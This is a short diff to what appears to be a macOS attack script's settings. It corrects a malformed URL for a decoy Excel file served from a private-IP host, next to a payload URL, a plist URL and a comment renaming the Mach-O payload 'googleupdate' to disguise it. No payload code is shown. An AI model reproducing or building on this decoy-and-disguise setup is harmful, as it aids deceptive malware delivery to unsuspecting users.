@@ -8,7 +8,7 @@ URL="https://192.168.1.5:8443/osx"
 PLISTURL="https://192.168.1.5:8443/plist"
 
 # URL to download a real excel file
-EXCELURL="https://https://192.168.1.5:8443/excel.xls"
+EXCELURL="https://192.168.1.5:8443/excel.xls"
 
 # Rename our payload macho-o name
 PAYLOAD="googleupdate"
